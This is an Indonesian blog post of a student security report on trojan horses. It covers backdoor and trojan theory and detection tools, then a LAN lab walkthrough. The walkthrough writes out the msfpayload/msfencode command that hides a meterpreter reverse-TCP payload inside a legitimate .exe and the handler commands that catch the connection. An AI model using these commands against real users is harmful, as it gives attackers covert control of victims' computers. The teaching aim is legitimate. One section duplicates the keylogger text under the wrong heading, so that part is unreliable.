---
layout: post
title: Demonstrasi Trojan Horse dengan Metasploit Framework Payload
categories: bachelor
tags: [Linux, trojan horse, metasploit framework, msfpayload, Windows, backdoor, malware, virus, tugas kuliah, penulisan ilmiah]
featuredimage: https://cdn.steemitimages.com/DQmfXUKTUFdXH4Ptfg8t7P7L39mC1fiGcBqiV3s8zEjZDKM/Gambar%200.%20Illustrasi%20Trojan%20Horse%20MSFpayload.png
description: Praktik Metasploit Framework Payload, bedanya dengan backdoor biasa adalah trojan horse menyamar sebagai program sah.
canonicalurl: https://0fajarpurnama0.github.io/bachelor/2020/11/28/demonstrasi-trojan-horse-dengan-msfpayload
---
![Gambar 0. Illustrasi Trojan Horse MSFpayload.png](https://cdn.steemitimages.com/DQmfXUKTUFdXH4Ptfg8t7P7L39mC1fiGcBqiV3s8zEjZDKM/Gambar%200.%20Illustrasi%20Trojan%20Horse%20MSFpayload.png)

Gambar 0\. Illustrasi Trojan Horse MSFpayload



## Catatan

Ini merupakan tugas S1 saya di mata kuliah Sistem Keamanan Data dimana tugasnya adalah menuis essai mengenai Trojan Horse berkelompok namun saya juga tertarik untuk mempraktikannya. Oleh karena itu saya coba mempraktikan trojan horse dengan metasploit framework. Bedanya trojan horse dengan backdoor biasa adalah trojan horse menyamar sebagai program sah. Selain saya kelompok ini terdiri dari Dwi Angga Pratama, Yulianti Murprayana, Linda Krisna Dewi, dan Agus Riki Gunawan. Tugas ini tidak pernah dipublikasi dimanapun dan kami sebagai penulis dan pemegang hak cipta melisensi tugas ini customized CC-BY-SA dimana siapa saja boleh membagi, menyalin, mempublikasi ulang, dan menjualnya dengan syarat mencatumkan nama kami sebagai penulis dan memberitahu bahwa versi asli dan terbuka tersedia disini.

## BAB 1 Pendahuluan

### 1.1 Latar Belakang

Trojan horse merupakan suatu malware yang umum kita ketahui. Secara singkat dia merupakan suatu backdoor dimana malware ini dilampirkan pada suatu file lalu dia akan bekerja jika file tersebut dijalankan. Di kalangan masyarakat banyak menggunakan antivirus seperti AVG, Avast, Avira, Kaspersky, atau lain-lainnya dan sering kejadian bahwa antivirus tersebut mendeteksi trojan. Namun baru sedikit yang mengetahui trojan itu apa dan bagaimana dia bekerja. Pada percobaan ini akan di gambarkan bagaimana trojan horse dengan menggunakan msfpayload dari metasploit.

### 1.2 Rumusan Masalah

Bagaimana gambaran trojan horse bekerja?

### 1.3 Tujuan

Menggambarkan cara kerja trojan horse dengan menggunakan metasploit.

### 1.4 Manfaat

Mendapatkan gambaran bagaimana trojan horse bekerja dengan melihat proses pembobolan sistem secara langsung.

### 1.5 Ruang Lingkup dan Batasan

*   File yang digunakan untuk percobaan dengan extensi .exe.*   Backdoor dibuat dengan msfpayload dan dijalankan dengan metasploit.*   Korban adalah Windows 7.*   Hanya terkoneksi secara LAN (Local Area Network).*   Korban tidak menggunakan antivirus.

## BAB 2 Dasar Teori

### 2.1 Pengertian Back Door

Back door merupakan akses khusus yang dibuat oleh seorang programmer untuk dapat masuk ke dalam sistem. Di dalam sistem operasi seorang programmer memasukkan perintah-perintah tertentu. Dari perintah-perintah inilah seorang hacker dapat melewati perintah-perintah yang harus dilalui apabila seseorang memasuki suatu sistem operasi tapi kode-kode yang disisipkan tersebut tidak mempengaruhi kinerja sistem operasi.

Istilah backdoor sekarang digunakan oleh hacker-hacker untuk merujuk kepada mekanisme yang mengizinkan seorang peretas sistem dapat mengakses kembali sebuah sistem yang telah diserang sebelumnya tanpa harus mengulangi proses eksploitasi terhadap sistem atau jaringan tersebut, seperti yang ia lakukan pertama kali. Umumnya, setelah sebuah jaringan telah diserang dengan menggunakan exploit (terhadap sebuah kerawanan/vulnerability), seorang penyerang akan menutupi semua jejaknya di dalam sistem yang bersangkutan dengan memodifikasi berkas catatan sistem (log) atau menghapusnya, dan kemudian menginstalasikan sebuah backdoor yang berupa sebuah perangkat lunak khusus atau menambahkan sebuah akun pengguna yang memiliki hak akses sebagai administrator jaringan atau administrator sistem tersebut. Jika kemudian pemilik jaringan atau sistem tersebut menyadari bahwa sistemnya telah diserang, dan kemudian menutup semua kerawanan yang diketahui dalam sistemnya (tapi tidak mendeteksi adanya backdoor yang terinstalasi), penyerang yang sebelumnya masih akan dapat mengakses sistem yang bersangkutan, tanpa ketahuan oleh pemilik jaringan, apalagi setelah dirinya mendaftarkan diri sebagai pengguna yang sah di dalam sistem atau jaringan tersebut. Dengan memiliki hak sebagai administrator jaringan, ia pun dapat melakukan hal yang dapat merusak sistem atau menghilangkan data. Dalam kasus seperti di atas, cara yang umum digunakan adalah dengan melakukan instalasi ulang terhadap sistem atau jaringan, atau dengan melakukan restorasi dari cadangan/backup yang masih bersih dari backdoor.

Ada beberapa perangkat yang dapat digunakan untuk menginstalasikan backdoor, seperti halnya beberapa Trojan horse, tetapi yang populer adalah Netcat, yang dapat digunakan di dalam sistem operasi Windows ataupun UNIX.

### 2.2 Pengertian Trojan Horse

Trojan Horse ini disebut kuda troya dimana trojan horse tidak menyebar seperti lain. Trojan horse tidak tergolong virus walaupun karakteristiknya sama, Trojan menginfeksi computer melalui file yang kelihatannya tidak berbahaya dan biasanya justru melakukan sesuatu yang berguna. Namun akhirnya virus menjadi berbahaya, misalnya saat melakukan format hardisk.

### 2.3 Cara Kerja Trojan Hourse

Trojan masuk melalui dua bagian, yaitu bagian client dan server. Jadi hacker kadang harus berjalan menanamkan trojannya di komputer korban ataupun memancing agar sang korban mengeksekusi/membuka file yang mengandung Trojan, namun ada juga Trojan yang langsung menginfeksi korbannya hanya dengan berbekal ip korban misalnya Kaht. Ketika korban (tanpa diketahui) menjalankan file yang mengandung Trojan pada komputernya, kemudian penyerang akan menggunakan client untuk koneksi dengan server dan mulai menggunakan trojan. Protokol TCP/IP adalah jenis protokol yang umum digunakan untuk komunikasi, Trojan dapat bekerja dengan baik dengan jenis protokol ini, tetapi beberapa trojan juga dapat menggunakan protokol UDP dengan baik. Ketika server mulai dijalankan (pada komputer korban), Trojan umumnya mencoba untuk menyembunyikan diri di suatu tempat dalam sistem komputer tersebut, kemudian mulai membuka beberapa port untuk melakukan koneksi, memodifikasi registry dan atau menggunakan metode lain yaitu metode autostarting agar trojan menjadi otomatis aktif saat komputer dihidupkan. Trojan sangat berbahaya bagi pengguna komputer yang tersambung jaringan komputer atau internet, karena bisa jadi hacker bisa mencuri data-data sensitif misalnya password email, dial-up passwords, webservices passwords, e-mail address, dokumen pekerjaan, internet banking, paypal, e-gold,kartu kredit dan lain-lain.

### 2.4 Macam-macam Trojan Hourse

#### 2.4.1 Trojan Remote Access

Trojan Remote Access termasuk Trojan paling populer saat ini. Banyak penyerang menggunakan Trojan ini dengan alasan fungsi yang banyak dan sangat mudah dalam penggunaannya. Prosesnya adalah menunggu seseorang menjalankan Trojan yang berfungsi sebagai server dan jika penyerang telah memiliki IP address korban, maka penyerang dapat mengendalikan secara penuh komputer korban. Contoh jenis Trojan ini adalah Back Orifice (BO), yang terdiri dari BOSERVE.EXE yang dijalankan dikomputer korban dan BOGUI.EXE yang dijalankan oleh penyerang untuk mengakses komputer korban.

#### 2.4.2 Trojan Pengirim Password

Tujuan dari Trojan jenis ini adalah mengirimkan password yang berada di komputer korban atau di Internet ke suatu e-mail khusus yang telah disiapkan. Contoh password yang disadap misalnya untuk ICQ, IRC, FTP, HTTP atau aplikasi lain yang memerlukan seorang pemakai untuk masuk suatu login dan password. Kebanyakan Trojan ini menggunakan port 25 untuk mengirimkan e-mail. Jenis ini sangat berbahaya jika dalam komputer terdapat password yang sangat penting.

#### 2.4.3 Trojan File Transfer Protocol (FTP)

Trojan FTP adalah paling sederhana dan dianggap ketinggalan jaman. Satu-satunya fungsi yang dijalankan adalah membuka port 21 di komputer korban yang menyebabkan mempermudah seseorang memiliki FTP client untuk memasuki komputer korban tanpa password serta melakukan download atau upload file.

#### 2.4.4 Keyloggers

Keyloggers termasuk dalam jenis Trojan yang sederhana, dengan fungsi merekam atau mencatat ketukan tombol saat korban melakukan pengetikan dan menyimpannya dalam logfile. Apabila diantara ketukan tersebut adalah mengisi user name dan password, maka keduanya dapat diperoleh penyerang dengan membaca logfile. Trojan ini dapat dijalankan pada saat komputer online maupun offline. Trojan ini dapat mengetahui korban sedang online dan merekam segala sesuatunya, pada saat offline proses perekaman dilakukan setelah Windows dijalankan dan disimpan dalam hardisk korban dan menunggu saat online untuk melakukan transfer atau diambil oleh penyerang.

#### 2.4.5 Trojan Penghancur

Keyloggers termasuk dalam jenis Trojan yang sederhana, dengan fungsi merekam atau mencatat ketukan tombol saat korban melakukan pengetikan dan menyimpannya dalam logfile. Apabila diantara ketukan tersebut adalah mengisi user name dan password, maka keduanya dapat diperoleh penyerang dengan membaca logfile. Trojan ini dapat dijalankan pada saat komputer online maupun offline. Trojan ini dapat mengetahui korban sedang online dan merekam segala sesuatunya, pada saat offline proses perekaman dilakukan setelah Windows dijalankan dan disimpan dalam hardisk korban dan menunggu saat online untuk melakukan transfer atau diambil oleh penyerang.

#### 2.4.6 Trojan Denial of Service (DoS) Attack

Trojan DoS Attack saat ini termasuk yang sangat populer. Trojan ini mempunyai kemampuan untuk menjalankan Distributed DoS (DDoS) jika mempunyai korban yang cukup. Gagasan utamanya adalah bahwa jika penyerang mempunyai 200 korban pemakai ADSL yang telah terinfeksi, kemudian mulai menyerang korban secara serempak. Hasilnya adalah lalu lintas data yang sangat padat karena permintaan yang bertubi-tubi dan melebihi kapasitas band width korban. Hal tersebut menyebabkan akses Internet menjadi tertutup. Wintrinoo adalah suatu tool DDoS yang populer baru-baru ini, dan jika penyerang telah menginfeksi pemakai ADSL, maka beberapa situs utama Internet akan collaps. Variasi yang lain dari sebuah trojan DoS adalah trojan mail-bomb, tujuan utamanya adalah untuk menginfeksi sebanyak mungkin komputer dan melakukan penyerangan secara serempak ke alamat e-mail yang spesifik maupun alamat lain yang spesifik dengan target yang acak dan muatan/isi yang tidak dapat disaring.

#### 2.4.7 Trojan Proxy/Wingate

Bentuk dan corak yang menarik diterapkan oleh pembuat trojan untuk mengelabui korban dengan memanfaatkan suatu Proxy/Wingate server yang disediakan untuk seluruh dunia atau hanya untuk penyerang saja. Trojan Proxy/Wingate digunakan pada Telnet yang tanpa nama, ICQ, IRC, dan untuk mendaftarkan domain dengan nomor kartu kredit yang telah dicuri serta untuk aktivitas lain yang tidak sah. Trojan ini melengkapi penyerang dengan keadaan tanpa nama dan memberikan kesempatan untuk berbuat segalanya terhadap komputer korban dan jejak yang tidak dapat ditelusuri.

#### 2.4.8 Software Detection Killers

Beberapa Trojan telah dilengkapi dengan kemampuan melumpuhkan fungsi software pendeteksi, tetapi ada juga program yang berdiri sendiri dengan fungsi yang sama. Contoh software pendeteksi yang dapat dilumpuhkan fungsinya adalah Zone Alarm, Norton Anti-Virus dan program anti-virus/firewall yang lain berfungsi melindungi komputer. Ketika software pendeteksi dilumpuhkan, penyerang akan mempunyai akses penuh ke komputer korban, melaksanakan beberapa aktivitas yang tidak sah, menggunakan komputer korban untuk menyerang komputer yang lain.

### 2.5 Cara Mengatasi Bahaya Trojan Horse

#### 2.5.1 Task List

Pendeteksiannya dengan melihat daftar program yang sedang berjalan dalam task list. Daftar dapat ditampilkan dengan menekan tombol CTRL+ALT+DEL atau klik kanan pada toolbar lalu klik task manager. Selain dapat mengetahui program yang berjalan, pemakai dapat melakukan penghentian terhadap suatu program yang dianggap aneh dan mencurigakan. Namun beberapa Trojan tetap mampu menyembunyikan dari task list ini. Sehingga untuk mengetahui secara program yang berjalan secara keseluruhan perlu dibuka System Information Utility(msinfo32.exe) yang berada di C:\Program files\common files\microsoft shared\msinfo. Tool ini dapat melihat semua proses itu sedang berjalan, baik yang tersembunyi dari task list maupun tidak. Hal-hal yang perlu diperiksa adalah path, nama file, properti file dan berjalannya file *.exe serta file *.dll.

#### 2.5.2 Netstat

Semua Trojan membutuhkan komunikasi. Jika mereka tidak melakukan komunikasi berarti tujuannya sia-sia. Hal ini adalah kelemahan yang utama dari Trojan, dengan komunikasi berarti mereka meninggalkan jejak yang kemudian dapat ditelusuri. Perintah Netstat berfungsi membuka koneksi ke dan dari komputer seseorang. Jika perintah ini dijalankan maka akan menampilkan IP address dari komputer tersebut dan komputer yang terkoneksi dengannya. Jika ditemukan IP address yang tidak dikenal maka perlu diselidiki lebih lanjut, mengejar dan menangkapnya.

#### 2.5.3 TCP View

TCPVIEW adalah suatu free utility dari Sysinternals yang mempunyai kemampuan menampilkan IP address dan menampilkan program yang digunakan oleh orang lain untuk koneksi dengan komputer pemakai. Dengan menggunakan informasi tersebut, maka jika terjadi penyerangan dapat diketahui dan dapat melakukan serangan balik. Langkah penghapusan Trojan Trojan dapat dihapus dengan: Menggunakan Software Anti-Virus. Sebagian antivirus dapat digunakan untuk mengenali dan menghapus Trojan. Menggunakan Software Trojan Scanner, software yang di khususkan untuk mendeteksi dan menghapus Trojan Cara yang paling sadis yah diinstal ulang komputernya.

### 2.6 Pengertian Metasploit

Metasploit merupakan sofware security yang sering digunakan untuk menguji coba ketahanan suatu sistem dengan cara mengeksploitasi kelemahan software suatu sistem. Metasploit biasanya digunakan untuk menyerang application layer dengan 0 day attack yang merupakan metode penyerangan pada software yang belum di patch. Metasploit biasa dikaitkan dengan istilah remote exploitation,maksudnya penyerang berada pada jarak jangkauan yang jauh dapat mengendalikankomputer korban. Metasploit menyerang dengan cara mengirimkan exploit pada komputer korban. Exploit ini berisi payload yang sudah ditentukan oleh penyerang. Exploit adalah software yang berfungsi untuk memanfaatkan kelemahan padasoftware korban(misal web browser), setelah berhasil mengeksploitasinya exploit tersebut memasukkan payload ke dalam memori korban. Payload merupakan sebuah executable milik penyerang yang akan di run pada komputer korban dengan tujuan dapat mengendalikan komputer tersebut secara remote atau memasang backdoor ,trojan, virus, worm, dan lain-lain. Terlepas dari penggunaan metasploit yang disalahgunakan untuk kejahatan, software ini juga membantu System Security untuk memperkuat pertahanan jaringannya dari ulah penyerang dari luar.

## BAB 3 Metode Percobaan

### 3.1 Tempat dan Waktu Percobaan

Percobaan dilakukan di rumah di Jln. Kusuma Bangsa 5, Denpasar, Bali. Waktu percobaan pada hari Senin, tanggal 5 April 2013, pada jam 23:00 – 24:00.

### 3.2 Alat dan Bahan

Laptop ACER

*   Intel® Pentium® dual – core processor T4200 (2.0 GHz, 800 MHz FSB, 1 MB L2 cache)
*   Mobile Intel® Graphics Media Accelerator 4500MHD
*   1GB DDR2
*   128 WXGA Acer CrystalBriteTM LCD
*   250GB HDD
*   Realtek Semiconductor Co., Ltd. RTL8111/8168B PCI Express Gigabit Ethernet Controller
*   Atheros Communications Inc. AR928X Wireless Network Adapter
*   Operating System Linux Backtrack 5 R3 32 bit

PC

*   Intel® Pentium® core i5 processor
*   4 GB RAM
*   1GB VGA
*   Gigabit Ethernet Controller
*   Alcor Micro, Corp. USB 2.0 PC Camera
*   Operating System Windows 7 Ultimate 32 bit

### 3.3 Cara Percobaan

Jika belum memiliki metasploit maka install dengan command “apt-get install metasploit apache2”. Karena metasploit versi 4.5 maka harus diinstall via web, oleh karena itu diperlukan apache. Lalu buka browser dan buka [https://localhost:3790](https://localhost:3790). Dapatkan lisensinya dan upadate diterminal dengan command “msfupdate”. Jika benar maka akan ada folder /opt/metasploit.

![Gambar 3.1 Install metasploit.jpeg](https://cdn.steemitimages.com/DQmfFmMUUdjoCPMwmTr3BKHs7faSnHgqQ4SoMg5ynw3U16w/Gambar%203.1%20Install%20metasploit.jpeg)

Gambar 3.1 Install metasploit



Untuk melihat jenis payload yang disediakan metasploit maka gunakan “msfpayload -l”. Yang akan digunakan adalah windows/meterpreter/reverse_tcp.

![Gambar 3.2 Melihat payload yang disediakan metasploit 1.jpeg](https://cdn.steemitimages.com/DQmQt9GBWAo3Mbfz7tq5wrxJQdwzk7SqNL5aqickVXu3oZV/Gambar%203.2%20Melihat%20payload%20yang%20disediakan%20metasploit%201.jpeg)

Gambar 3.2 Melihat payload yang disediakan metasploit 1

![Gambar 3.3 Melihat payload yang disediakan metasploit 2.jpeg](https://cdn.steemitimages.com/DQmUMk9yGPGo231nGzMeeJWQSk8EZqVA8czC4cJYaoNivNy/Gambar%203.3%20Melihat%20payload%20yang%20disediakan%20metasploit%202.jpeg)

Gambar 3.3 Melihat payload yang disediakan metasploit 2



Lihat lah IP address pada perangkat jaringan yang ingin di koneksikan dengan perintah “ifconfig”. Disini IP address adalah 192.168.0.1.

![Gambar 3.4 Melihat IP address perangkat jaringan.jpeg](https://cdn.steemitimages.com/DQmfGeoieKw3ak2gS7YTRY4m4y4Z4iusS1RBaVC5VX4vNy9/Gambar%203.4%20Melihat%20IP%20address%20perangkat%20jaringan.jpeg)

Gambar 3.4 Melihat IP address perangkat jaringan



Disini file yang akan dilampirkan payload adalah mdma.exe yang terlekatk di /root. Maka perintahnya adalah “msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=443 R | msfencode -e x86/shikata_ga_nai -c 5 -t exe -x /root/mdma.exe -k -o /root/mdma1.exe”. LHOST merupakan listening host yaitu IP address pada perangkat jaringan ini. LPORT merupakan listening port tergantung selera. Berkat msfencode dan shikata_ga_nai maka pelampiran trojan memungkinkan. -e menentukan format yaitu x86, -c menentukan jumlah iterasi, -t memilih extensi file, -x dengan menentukan lokasi file, -k adalah agar payload bekerja pada task lain dengan program aslinya masih tetap bisa berjalan, dan -o adalah tempat dan nama file baru.

![Gambar 3.5 Membuat backdoor.jpeg](https://cdn.steemitimages.com/DQmfGVQeh1iqtFHoxBpFxDaV3o7cGGa8ytwLWauHcBPDEHz/Gambar%203.5%20Membuat%20backdoor.jpeg)

Gambar 3.5 Membuat backdoor



Siapkan msfconsole untuk mengendalikan komputer korban. Ketik “-help” jika belum terbiasa pada perintah. Tersedia fasilitas perintah “search [kata apa="" saja=""]” untuk melihat perintah yang berkaitan dengan apa yang diketik.

![Gambar 3.6 Msfconsole.jpeg](https://cdn.steemitimages.com/DQmYWsyKDhiQhURpB3JYMzsYStxwmZ5CyG1B7j7PRdiH7we/Gambar%203.6%20Msfconsole.jpeg)

Gambar 3.6 Msfconsole



Ketik perintah “use exploit/multi/handler” (yang digunakan untuk backdoor). Selanjutnya ketik perintah “set payload windows/meterpreter/reverse_tcp” (payload yang digunakan).

![Gambar 3.7 Menggunakan exploitmultihandler.jpeg](https://cdn.steemitimages.com/DQmQFXSsNf2h1hdgCV5i2nKvJ52F8vcGfoZbkCrLuQ7wZvS/Gambar%203.7%20Menggunakan%20exploitmultihandler.jpeg)

Gambar 3.7 Menggunakan exploit/multi/handler

![Gambar 3.8 Menggunakan windowsmeterpreterreverse_tcp.jpeg](https://cdn.steemitimages.com/DQmT6cMgKLHfBm1mBUbKaBoRbnM8UfZMjihPsFWrVajaiXZ/Gambar%203.8%20Menggunakan%20windowsmeterpreterreverse_tcp.jpeg)

Gambar 3.8 Menggunakan windows/meterpreter/reverse_tcp



Lanjutkan dengan perintah “set lhost 192.168.0.1” (listening host), lalu “set lport 443” (listening port), ketik “show options” untuk melihat pengaturan.

![Gambar 3.9 Mengatur option.jpeg](https://cdn.steemitimages.com/DQmVtJkZirgvdfLPYmDXFw8uRUC7N56ts8YApZzCYQHTzmp/Gambar%203.9%20Mengatur%20option.jpeg)

Gambar 3.9 Mengatur option



Perintah terakhir adalah “exploit”, tinggal menunggu korban menjalankan mdma1.exe.

![Gambar 3.10 Perintah exploit.jpeg](https://cdn.steemitimages.com/DQmbvh2rcY9UpkT4DEWckH586dCV5s6sqxCahsVg6oJSJeZ/Gambar%203.10%20Perintah%20exploit.jpeg)

Gambar 3.10 Perintah exploit



## BAB 4 Pembahasan

### 4.1 Memasuki PC korban dengan backdoor yang telah dibuat

Asumsi bahwa PC korban tidak menggunakan antivirus dan korban dikirimkan file mdma1.exe dan menjalankannya. Terlihat bahwa program berjalan seperti biasa namun dibuka akses dari PC penyerang. Berikut merupakan konfigurasi IP dari PC korban:

![Gambar 4.1 File mdma1.exe akan dikirim ke PC korban.jpeg](https://cdn.steemitimages.com/DQmd1fu6uaYK8cUk9V9hrjode6TJxndnYznRtFBzz5HyLv3/Gambar%204.1%20File%20mdma1.exe%20akan%20dikirim%20ke%20PC%20korban.jpeg)

Gambar 4.1 File mdma1.exe akan dikirim ke PC korban

![Gambar 4.2 IP Address PC korban.jpg](https://cdn.steemitimages.com/DQmWz3DBRLJN6KhVmyjQBREPUNRrDky5P5CFnJrR4b9pfSZ/Gambar%204.2%20IP%20Address%20PC%20korban.jpg)

Gambar 4.2 IP Address PC korban

![Gambar 4.3 Korban membuka file mdma1.exe .jpg](https://cdn.steemitimages.com/DQmRMA7HvzZuhSQnP9F91v1CsXhnjjf2x42CGmP8C1ZRrgj/Gambar%204.3%20Korban%20membuka%20file%20mdma1.exe%20.jpg)

Gambar 4.3 Gambar 4.3 Korban membuka file mdma1.exe

![Gambar 4.4 PC penyerang mendapat akses.jpeg](https://cdn.steemitimages.com/DQmToKMzgZebn3WgkwP9JtSFqLXJbb4eDrdbPHcnsMPQyYY/Gambar%204.4%20PC%20penyerang%20mendapat%20akses.jpeg)

Gambar 4.4 PC penyerang mendapat akses

![Gambar 4.5 Tampak isi partisi D pada PC korban.jpg](https://cdn.steemitimages.com/DQmQsDRfU3vMK65kn5NVSzSxfoWtUAXnro29x5wBgbnmwLb/Gambar%204.5%20Tampak%20isi%20partisi%20D%20pada%20PC%20korban.jpg)

Gambar 4.5 Dibuktikan dengan melihat directory tampak isi partisi D pada PC korban

![Gambar 4.6 Tampak isi partisi D dari sisi PC penyerang.jpeg](https://cdn.steemitimages.com/DQmcHKZAFsHe4cNwo9MRrM1Zbt3Ggr1hkYwdnMXWREnc3gL/Gambar%204.6%20Tampak%20isi%20partisi%20D%20dari%20sisi%20PC%20penyerang.jpeg)

Gambar 4.6 Tampak isi partisi D dari sisi PC penyerang



## BAB 5 Penutup

### 5.1 Simpulan

Dari percobaan digambarkan bahwa trojan horse, backdoor dan sejenisnya bekerja secara tersembunyi. Malware disisipkan pada suatu file dan akan bekerja bila file itu dijalankan. Filenya bekerja seperti biasa tetapi juga menjalankan tugas lain berdasarkan malware yang disisipkan. Pada percobaan ini tugas malware adalah memberi akses kepada PC penyerang ke PC korban. Sehingga PC penyerang mendapatkan akses layaknya admin.

### 5.2 Saran

Percobaan ini dapat dikembangkan lebih lanjut. Contohnya dengan PC korban menggunakan antivirus, operating system selain Windows, atau hal – hal lainnya. Bisa juga dengan menggunakan selain msfpayload, membuat program sendiri, membikin trojan konsep baru, atau hal – hal lainnya.

## Mirror

*   [https://www.publish0x.com/fajar-purnama-academics/demonstrasi-trojan-horse-dengan-metasploit-framework-payload-xjjkkej?a=4oeEw0Yb0B&tid=weebly](https://www.publish0x.com/fajar-purnama-academics/demonstrasi-trojan-horse-dengan-metasploit-framework-payload-xjjkkej?a=4oeEw0Yb0B&tid=weebly)
*   [https://0fajarpurnama0.github.io/bachelor/2020/11/28/demonstrasi-trojan-horse-dengan-msfpayload](https://0fajarpurnama0.github.io/bachelor/2020/11/28/demonstrasi-trojan-horse-dengan-msfpayload)
*   [https://0fajarpurnama0.medium.com/demonstrasi-trojan-horse-dengan-metasploit-framework-payload-df672434424b](https://0fajarpurnama0.medium.com/demonstrasi-trojan-horse-dengan-metasploit-framework-payload-df672434424b)
*   [https://hicc.cs.kumamoto-u.ac.jp/~fajar/bachelor/demonstrasi-trojan-horse-dengan-msfpayload](https://hicc.cs.kumamoto-u.ac.jp/~fajar/bachelor/demonstrasi-trojan-horse-dengan-msfpayload)
*   [https://blurt.buzz/blurtindonesia/@fajar.purnama/demonstrasi-trojan-horse-dengan-metasploit-framework-payload?referral=fajar.purnama](https://blurt.buzz/blurtindonesia/@fajar.purnama/demonstrasi-trojan-horse-dengan-metasploit-framework-payload?referral=fajar.purnama)
*   [https://0darkking0.blogspot.com/2020/11/demonstrasi-trojan-horse-dengan.html](https://0darkking0.blogspot.com/2020/11/demonstrasi-trojan-horse-dengan.html)
*   [https://0fajarpurnama0.cloudaccess.host/index.php/9-fajar-purnama-academics/121-demonstrasi-trojan-horse-dengan-metasploit-framework-payload](https://0fajarpurnama0.cloudaccess.host/index.php/9-fajar-purnama-academics/121-demonstrasi-trojan-horse-dengan-metasploit-framework-payload)
*   [https://steemit.com/indonesia/@fajar.purnama/demonstrasi-trojan-horse-dengan-metasploit-framework-payload?r=fajar.purnama](https://steemit.com/indonesia/@fajar.purnama/demonstrasi-trojan-horse-dengan-metasploit-framework-payload?r=fajar.purnama)
*   [http://0fajarpurnama0.weebly.com/blog/demonstrasi-trojan-horse-dengan-metasploit-framework-payload](http://0fajarpurnama0.weebly.com/blog/demonstrasi-trojan-horse-dengan-metasploit-framework-payload)
*   [https://0fajarpurnama0.wixsite.com/0fajarpurnama0/post/demonstrasi-trojan-horse-dengan-metasploit-framework-payload](https://0fajarpurnama0.wixsite.com/0fajarpurnama0/post/demonstrasi-trojan-horse-dengan-metasploit-framework-payload)
*   [https://read.cash/@FajarPurnama/demonstrasi-trojan-horse-dengan-metasploit-framework-payload-ffc6463c](https://read.cash/@FajarPurnama/demonstrasi-trojan-horse-dengan-metasploit-framework-payload-ffc6463c)